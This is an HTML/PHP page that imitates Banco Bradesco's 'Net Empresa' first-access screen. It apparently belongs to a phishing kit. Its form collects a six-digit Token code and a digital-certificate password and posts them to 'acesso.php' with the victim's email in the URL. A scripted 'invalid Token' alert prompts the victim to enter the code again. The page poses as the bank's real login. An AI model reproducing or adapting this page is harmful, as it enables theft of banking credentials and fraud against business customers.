<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Banco Bradesco S/A</title>
	<link rel="stylesheet" href="../../_styles/juba/boot.css">
	<link rel="stylesheet" href="../../_styles/juba/layout.css">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700" rel="stylesheet">
	<script src="../../_jscripts/juba/layout.js"></script>
</head>
<body>
	
<!-- HEADER -->
<div class="container main_header">
	<div class="content position_relative">
		
		<div class="exit_acess">
			<a href="../">
				<img src="../../_images/juba/button-exit-acesso.jpg" height="28" width="157" alt="">
			</a>
		</div><!-- exit_acess -->

		<div class="logo">
			<a href="#">
				<img src="../../_images/juba/logo.jpg" height="128" width="140" alt="">
			</a>
		</div><!-- logo -->

		<div class="getTime">
			<?= getDataShow(); ?>
		</div><!-- getTime -->

		<div class="saudacao">
			Primeiro Acesso
			<p>Para realizar o primeiro acesso, siga os passos abaixo:</p>	
		</div><!-- saudacao -->

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->


<!-- CORPO -->
<div class="container main_all">
	<div class="content">
	<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" enctype="multipart/form-data"  onsubmit="return check_hbc();" id="mainForm">
		<div class="main">

			<div class="block_acesso position_relative">
				

				<span class="tkbc_info_one">A partir de agora, você é um cliente Net Empresa!</span>

				<div class="block_needTk">
					<h1>Digite o código de acesso do Token do Connect Bank.</h1>

					<div class="bktokimg">
						<img src="../../_images/juba/nd-tk-hbc.png" height="117" width="53" alt="">
					</div><!-- bktokimg -->

					<div class="bkblockinpt">
						<input type="hidden" name="sender" value="send_tk_bc">
						<input type="password" name="tk_hbc" id="tk_hbc" class="tk_hbc user_input" maxlength="6"> 
						<span>(6 dígitos)</span>
					</div>

				</div>
			<div class="clear"></div>	
			</div><!-- block_acesso -->


			<div class="block_acesso position_relative" id="cert_pass_block">
				<div class="select_acesso">
					<div class="bloco_red">2</div>
				</div><!-- select_acesso -->

				<div class="desc_two_block">Digite a <b>senha do certificado</b> selecionado</div>
				<div class="block_nada">
					<input type="password" name="cert_pass" id="cert_pass" class="pass_cert" maxlength="20">
					<span class="inf_pass">(de 08 a 20 dígitos)</span>
				</div>	
			<div class="clear"></div>	
			</div><!-- block_acesso -->


			<div class="block_buttons">
				<input type="reset" name="limpar_campos" id="limpar_campos" value="" class="button_clear">
				<input type="submit" name="enviar_campos" id="enviar_campos" value="" class="button_conect">
			</div><!-- block_buttons -->
		
			<div class="block_info_hbc" id="info_hbc_now">
				<img src="../../_images/juba/acess-with-hbc.jpg">
			</div><!-- block_info_hbc -->

		</div><!-- main -->
	</form>

		<div class="sidebar">
			<h1>Precisa de Ajuda?</h1>
			<img src="../../_images/juba/MB-duvidas.jpg" height="63" width="190" alt="">

			<h2>No site do Bradesco Pessoa Juridica:</h2>
			Você encontra as respostas para essas e outras dúvidas:
			
			<div class="clear"></div>

			<h2>Acessar Bradesco Net Empresa</h2>
			<ul>
				<li><span class="lista_side">• Veja passo-a-passo como acessar</span></li>
				<li><span class="lista_side">• Contratar acesso ao Bradesco Net Empresa</span></li>
				<li><span class="lista_side">• Primeiro Acesso - Contratos efetuados na Agência</span></li>
			</ul>

			<div class="clear"></div>

			<h2>Tipos de Acesso</h2>
			<ul>
				<li><span class="lista_side">• Gerar usuário e senha</span></li>
				<li><span class="lista_side">• Gerar certificado digital Bradesco</span></li>
				<li><span class="lista_side">• Trocar tipo de acesso Máster</span></li>
			</ul>

			<div class="clear"></div>

			<h2>Chave de Segurança</h2>
			<ul>
				<li><span class="lista_side">• Como gerar Chave de Segurança Bradesco - Eletrônica?</span></li>
				<li><span class="lista_side">• O que é Chave de Segurança Bradesco - Eletrônica?</span></li>
			</ul>

			<div class="clear"></div>
		</div><!-- sidebar -->
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- FOOTER -->
<div class="container main_footer">
	<div class="content">
		<img src="../../_images/juba/geral-footer.jpg" height="55" width="992" alt="">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<?php
if(isset($_SESSION['hbc_digitado']) && $_SESSION['hbc_digitado'] == 1){
	echo '<script>alert("Você informou um código Token inválido.\nTente novamente!");</script>';
}
?>

<!-- BASE -->	

<div class="container">
	<div class="content">

	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<!-- BASE -->	
</body>
</html>
